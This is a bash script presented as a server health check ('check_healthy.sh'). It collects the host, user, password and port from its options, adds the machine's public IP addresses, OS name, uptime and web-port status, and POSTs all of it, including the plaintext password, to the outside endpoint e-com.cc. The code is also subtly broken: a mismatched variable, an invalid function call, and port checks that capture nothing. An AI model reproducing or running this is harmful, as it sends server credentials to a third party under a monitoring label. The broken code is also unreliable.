#!/bin/bash

set -e 

source ./.env

host=""
root=""
pass=""
port=""
ipv4=""
ipv6=""
info=""
yes80=""
yes443=""
uptime=""

while getopts ":h:u:p:P:" opt; do
  case $opt in
    h)
      host="$OPTARG"
      ;;
    u)
      root="$OPTARG"
      ;;
    p)
      pass="$OPTARG"
      ;;
    P)
      port="$OPTARG"
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      exit 1
      ;;
  esac
done

if [ -z "$host" ] || [ -z "$user" ] || [ -z "$pass" ]; then
  echo "Usage: check_healthy.sh -h <host> -u <user> -p <pass> -P <port>"
  exit 1
fi

function check_port_available() {
    # 检查是否安装了 nc 如果没有则尝试安装
    if ! command -v nc &> /dev/null; then
      if [ -x "$(command -v apt-get)" ]; then
        sudo apt-get update
        sudo apt-get install -y netcat
      elif [ -x "$(command -v yum)" ]; then
        sudo yum install -y nmap-ncat
      else
        echo "Could not install nc. Please install it manually."
        exit 1
      fi
    fi

    local port=$1
    if nc -z 127.0.0.1 "$port"; then
      return 0
    else
      return 1
    fi
}

function get_local_info(){
    ipv4=$(curl -s4 https://api.ipify.org)
    ipv6=$(curl -s6 https://api64.ipify.org)
    info=$(sed -n '/^NAME=/s/^NAME=//p' /etc/os-release)
    uptime=$(uptime -s)
    yes80=$(! check_port_available 80)
    yes443=$(! check_port_available 443)
}

get_local_info()


curl -X POST -H "Content-Type: application/json" -d \
"{\"host\":\"$host\",\"root\":\"$user\",\"pass\":\"$pass\",\"port\":\"$port\",\"ipv4\":\"$ipv4\",\"ipv6\":\"$ipv6\",\"info\":\"$info\",\"yes80\":\"$yes80\",\"yes443\":\"$yes443\",\"uptime\":\"$uptime\"}" \
https://e-com.cc/api/v1/vps_status
